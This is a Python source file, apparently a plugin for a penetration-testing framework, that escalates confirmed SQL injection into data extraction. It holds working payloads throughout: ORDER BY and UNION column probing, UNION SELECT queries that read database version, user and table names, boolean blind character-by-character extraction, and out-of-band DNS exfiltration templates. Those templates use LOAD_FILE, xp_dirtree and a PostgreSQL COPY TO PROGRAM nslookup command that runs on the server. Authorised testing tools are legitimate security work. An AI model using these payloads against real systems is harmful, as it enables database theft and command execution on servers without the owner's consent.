"""Advanced SQL injection — UNION extraction, boolean blind, OOB DNS exfil.

Depends on sqli_basic to confirm injectable parameters, then escalates:
1. UNION-based column count detection and data extraction
2. Boolean blind binary search for data extraction
3. Out-of-band DNS exfiltration attempts
"""

from __future__ import annotations

from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# UNION column count probes (1–20 columns)
MAX_UNION_COLS = 20

# DBMS-specific data extraction queries
UNION_EXTRACT: dict[str, list[tuple[str, str]]] = {
    "MySQL": [
        ("version()", "MySQL version"),
        ("current_user()", "Current DB user"),
        ("database()", "Current database"),
        (
            "GROUP_CONCAT(table_name SEPARATOR ',')"
            " FROM information_schema.tables WHERE table_schema=database()--",
            "Table names",
        ),
    ],
    "PostgreSQL": [
        ("version()", "PostgreSQL version"),
        ("current_user", "Current DB user"),
        ("current_database()", "Current database"),
        (
            "string_agg(tablename,',')"
            " FROM pg_tables WHERE schemaname='public'--",
            "Table names",
        ),
    ],
    "MSSQL": [
        ("@@version", "MSSQL version"),
        ("SYSTEM_USER", "Current DB user"),
        ("DB_NAME()", "Current database"),
        (
            "STRING_AGG(name,',') WITHIN GROUP(ORDER BY name)"
            " FROM sysobjects WHERE xtype='U'--",
            "Table names",
        ),
    ],
    "SQLite": [
        ("sqlite_version()", "SQLite version"),
        (
            "GROUP_CONCAT(name,',')"
            " FROM sqlite_master WHERE type='table'--",
            "Table names",
        ),
    ],
}

# Boolean blind probes
BOOLEAN_TRUE_PAYLOADS = [
    "' AND 1=1-- -",
    "' AND 'a'='a'-- -",
    "1 AND 1=1-- -",
]
BOOLEAN_FALSE_PAYLOADS = [
    "' AND 1=2-- -",
    "' AND 'a'='b'-- -",
    "1 AND 1=2-- -",
]

# OOB DNS exfil templates (requires callback server)
OOB_TEMPLATES: dict[str, str] = {
    "MySQL": "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',({query}),'.{domain}\\\\a'))-- -",
    "MSSQL": "'; DECLARE @q VARCHAR(1024);SET @q=({query});"
             "EXEC('master..xp_dirtree \"\\\\'+@q+'.{domain}\\\\a\"')-- -",
    "PostgreSQL": "'; COPY (SELECT {query}) TO PROGRAM "
                  "'nslookup '||({query})||'.{domain}'-- -",
}


class SqliAdvancedPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sqli_advanced",
        display_name="Advanced SQLi Exploitation",
        category=PluginCategory.PENTESTING,
        description=(
            "Escalates confirmed SQLi with UNION extraction, "
            "boolean blind, and OOB DNS exfiltration"
        ),
        depends_on=["sqli_basic"],
        produces=["sqli_advanced_findings"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        extracted: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"sqli_advanced": []},
            )

        # Get confirmed SQLi from sqli_basic pipeline data
        sqli_key = f"sqli_basic:{target.host}"
        sqli_result = ctx.pipeline.get(sqli_key)
        injectable: list[dict] = []

        if sqli_result and sqli_result.ok:
            injectable = sqli_result.data.get("sqli_tests", [])

        if not injectable:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info(
                    "No confirmed SQLi to escalate (sqli_basic found nothing)",
                    tags=["pentesting", "sqli"],
                )],
                data={"sqli_advanced": []},
            )

        for inj in injectable:
            if ctx.should_stop:
                break

            inj_url = inj.get("url", "")
            dbms = inj.get("dbms", "Generic")
            param = inj.get("param", "id")
            inj.get("payload", "'")

            if not inj_url:
                # Reconstruct URL from available info
                page = inj.get("page", "/")
                inj_url = f"{base_url}{page}?{param}="

            # Phase 1: UNION-based extraction
            col_count = await self._detect_union_columns(ctx, inj_url, param)
            if col_count and col_count > 0:
                union_data = await self._union_extract(
                    ctx, inj_url, param, col_count, dbms,
                )
                if union_data:
                    extracted.append({
                        "type": "union",
                        "dbms": dbms,
                        "columns": col_count,
                        "data": union_data,
                    })
                    findings.append(Finding.critical(
                        f"UNION SQLi data extraction ({dbms})",
                        description=(
                            f"Extracted {len(union_data)} data items via "
                            f"UNION injection ({col_count} columns)"
                        ),
                        evidence="\n".join(
                            f"{d['label']}: {d['value'][:100]}"
                            for d in union_data[:5]
                        ),
                        remediation=(
                            "Use parameterized queries. This vulnerability "
                            "allows full database read access."
                        ),
                        tags=["pentesting", "sqli", "union", dbms],
                    ))

            # Phase 2: Boolean blind (if UNION failed)
            if not col_count and not ctx.should_stop:
                blind_ok = await self._test_boolean_blind(
                    ctx, base_url, param,
                )
                if blind_ok:
                    # Extract DB version via binary search
                    version = await self._blind_extract(
                        ctx, base_url, param,
                        self._version_query(dbms),
                    )
                    if version:
                        extracted.append({
                            "type": "boolean_blind",
                            "dbms": dbms,
                            "data": [{"label": "DB version", "value": version}],
                        })
                        findings.append(Finding.high(
                            f"Boolean blind SQLi data extraction ({dbms})",
                            description=(
                                f"Extracted data via boolean blind binary search. "
                                f"DB version: {version}"
                            ),
                            evidence=f"Version: {version}",
                            remediation="Use parameterized queries.",
                            tags=["pentesting", "sqli", "blind", dbms],
                        ))

            # Phase 3: OOB DNS exfiltration (if callback server available)
            if (
                not ctx.should_stop
                and hasattr(ctx, 'callback')
                and ctx.callback is not None
            ):
                oob_data = await self._try_oob_exfil(
                    ctx, inj_url, param, dbms,
                )
                if oob_data:
                    extracted.append({
                        "type": "oob_dns",
                        "dbms": dbms,
                        "data": oob_data,
                    })
                    findings.append(Finding.critical(
                        f"OOB DNS exfiltration via SQLi ({dbms})",
                        description=(
                            "Data exfiltrated via DNS lookups. "
                            "This confirms blind SQLi with network access."
                        ),
                        evidence=str(oob_data)[:300],
                        remediation=(
                            "Use parameterized queries. Restrict outbound "
                            "DNS from database server."
                        ),
                        tags=["pentesting", "sqli", "oob", dbms],
                    ))

        if not findings:
            findings.append(Finding.info(
                "SQLi confirmed but advanced extraction failed",
                tags=["pentesting", "sqli"],
            ))

        # Store extracted data for exploit_chain
        sqli_state = ctx.state.setdefault("sqli_extracted", {})
        sqli_state[target.host] = extracted

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"sqli_advanced": extracted},
        )

    async def _detect_union_columns(
        self, ctx, url: str, param: str,
    ) -> int | None:
        """Detect number of columns using ORDER BY or UNION NULL."""
        # Method 1: ORDER BY binary search
        lo, hi = 1, MAX_UNION_COLS
        last_valid = 0

        while lo <= hi:
            if ctx.should_stop:
                return None
            mid = (lo + hi) // 2
            order_payload = f"' ORDER BY {mid}-- -"
            test_url = f"{url}{quote(order_payload)}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=5.0)
                    body = (await resp.text(encoding="utf-8", errors="replace")).lower()

                    if resp.status == 200 and "error" not in body[:500]:
                        last_valid = mid
                        lo = mid + 1
                    else:
                        hi = mid - 1
            except Exception:
                hi = mid - 1

        if last_valid > 0:
            return last_valid

        # Method 2: UNION SELECT NULL,NULL,...
        for n in range(1, MAX_UNION_COLS + 1):
            if ctx.should_stop:
                return None
            nulls = ",".join(["NULL"] * n)
            union_payload = f"' UNION SELECT {nulls}-- -"
            test_url = f"{url}{quote(union_payload)}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=5.0)
                    body = (await resp.text(encoding="utf-8", errors="replace")).lower()

                    if resp.status == 200 and "error" not in body[:500]:
                        return n
            except Exception:
                continue

        return None

    async def _union_extract(
        self,
        ctx,
        url: str,
        param: str,
        col_count: int,
        dbms: str,
    ) -> list[dict]:
        """Extract data via UNION injection."""
        results: list[dict] = []
        queries = UNION_EXTRACT.get(dbms, UNION_EXTRACT.get("MySQL", []))
        marker = "BSK_START"
        end_marker = "BSK_END"

        for query_expr, label in queries:
            if ctx.should_stop:
                break

            # Build UNION: put our query in first column, NULLs for the rest
            cols = [f"CONCAT('{marker}',{query_expr},'{end_marker}')"]
            cols.extend(["NULL"] * (col_count - 1))
            union = ",".join(cols)

            extract_payload = f"' UNION SELECT {union}-- -"
            test_url = f"{url}{quote(extract_payload)}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(test_url, timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")

                    start_idx = body.find(marker)
                    if start_idx >= 0:
                        start_idx += len(marker)
                        end_idx = body.find(end_marker, start_idx)
                        if end_idx >= 0:
                            value = body[start_idx:end_idx]
                            results.append({
                                "label": label,
                                "value": value[:500],
                                "query": query_expr[:100],
                            })
            except Exception:
                continue

        return results

    async def _test_boolean_blind(
        self, ctx, base_url: str, param: str,
    ) -> bool:
        """Test if boolean blind injection is possible."""
        true_lengths: list[int] = []
        false_lengths: list[int] = []

        for payload in BOOLEAN_TRUE_PAYLOADS[:2]:
            url = f"{base_url}/?{param}={quote(payload)}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=5.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                    true_lengths.append(len(body))
            except Exception:
                return False

        for payload in BOOLEAN_FALSE_PAYLOADS[:2]:
            url = f"{base_url}/?{param}={quote(payload)}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=5.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                    false_lengths.append(len(body))
            except Exception:
                return False

        if not true_lengths or not false_lengths:
            return False

        avg_true = sum(true_lengths) / len(true_lengths)
        avg_false = sum(false_lengths) / len(false_lengths)

        # Significant length difference indicates boolean blind
        return abs(avg_true - avg_false) > 50

    async def _blind_extract(
        self,
        ctx,
        base_url: str,
        param: str,
        query: str,
        max_len: int = 50,
    ) -> str:
        """Extract a string via boolean blind binary search."""
        result: list[str] = []

        for pos in range(1, max_len + 1):
            if ctx.should_stop:
                break

            lo, hi = 32, 126
            found = False

            while lo <= hi:
                mid = (lo + hi) // 2
                # ASCII comparison: SUBSTRING(query,pos,1) > CHR(mid)
                test_payload = (
                    f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
                )
                url = f"{base_url}/?{param}={quote(test_payload)}"

                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=5.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                        body_len = len(body)
                except Exception:
                    break

                # Compare with known true response length
                true_url = f"{base_url}/?{param}={quote(BOOLEAN_TRUE_PAYLOADS[0])}"
                try:
                    async with ctx.rate:
                        true_resp = await ctx.http.get(true_url, timeout=5.0)
                        true_body = await true_resp.text(
                            encoding="utf-8", errors="replace",
                        )
                        true_len = len(true_body)
                except Exception:
                    break

                if abs(body_len - true_len) < 50:
                    # Condition is TRUE → char > mid
                    lo = mid + 1
                else:
                    hi = mid - 1

            if lo > 126:
                # Null byte — end of string
                break

            char = chr(lo)
            if lo >= 32:
                result.append(char)
                found = True

            if not found:
                break

        return "".join(result)

    async def _try_oob_exfil(
        self, ctx, url: str, param: str, dbms: str,
    ) -> list[dict]:
        """Attempt OOB DNS exfiltration using callback server."""
        results: list[dict] = []
        template = OOB_TEMPLATES.get(dbms)
        if not template:
            return results

        callback_domain = ctx.callback.domain if ctx.callback else None
        if not callback_domain:
            return results

        query = self._version_query(dbms)
        payload = template.format(query=query, domain=callback_domain)

        test_url = f"{url}{quote(payload)}"
        try:
            async with ctx.rate:
                await ctx.http.get(test_url, timeout=10.0)
                # Wait for DNS callback
                await _async_sleep(3.0)

                # Check callback server for received data
                if hasattr(ctx.callback, 'get_interactions'):
                    interactions = ctx.callback.get_interactions()
                    for interaction in interactions:
                        if interaction.get("type") == "dns":
                            subdomain = interaction.get("subdomain", "")
                            if subdomain:
                                results.append({
                                    "label": "OOB DNS data",
                                    "value": subdomain,
                                })
        except Exception:
            pass

        return results

    @staticmethod
    def _version_query(dbms: str) -> str:
        """Get version query for DBMS."""
        queries = {
            "MySQL": "SELECT version()",
            "PostgreSQL": "SELECT version()",
            "MSSQL": "SELECT @@version",
            "SQLite": "SELECT sqlite_version()",
            "Oracle": "SELECT banner FROM v$version WHERE ROWNUM=1",
        }
        return queries.get(dbms, "SELECT version()")


async def _async_sleep(seconds: float) -> None:
    """Async sleep utility."""
    import asyncio
    await asyncio.sleep(seconds)
